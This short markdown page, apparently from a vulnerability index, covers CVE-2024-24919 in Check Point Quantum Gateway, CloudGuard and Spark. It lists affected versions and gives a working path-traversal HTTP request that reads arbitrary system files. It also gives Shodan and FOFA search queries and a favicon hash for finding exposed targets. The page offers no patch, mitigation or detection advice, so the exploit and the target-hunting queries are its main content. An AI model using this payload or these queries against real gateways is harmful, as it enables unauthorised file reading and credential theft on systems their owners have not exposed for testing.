---
title: (CPSSLNE) CVE-2024-24919 - Databased Index
permalink: /cpsslne
---

<link rel="stylesheet" type="text/css" href="css/styles.css">

Vulnerability disclosed by [Checkpoint](https://blog.checkpoint.com/security/enhance-your-vpn-security-posture) on May 27th 2024. 

This vulnerability, when taken advantage of, grants the attacker read access to system files.

|Products Affected| Versions Affected|
|------------------|-----------------|
|Check Point Quantum Gateway| R81.20, R81.10, R81, R80.40|
|CloudGuard Network| R81.20, R81.10, R81, R80.40|
|Check Point Spark|R81.10, R80.20|

# Payload
```
POST /clients/MyCRL HTTP/1.1
Host: <Host>

aCSHELL/../../../../../../../<File>
```

# Lookup Methods
> Favicon Hash: 794809961


|Shodan|FOFA|
|-------|----|
|title:"Check Point" ssl:"target"|title="Check Point SSL Network Extender"|
|http.favicon.hash:794809961||
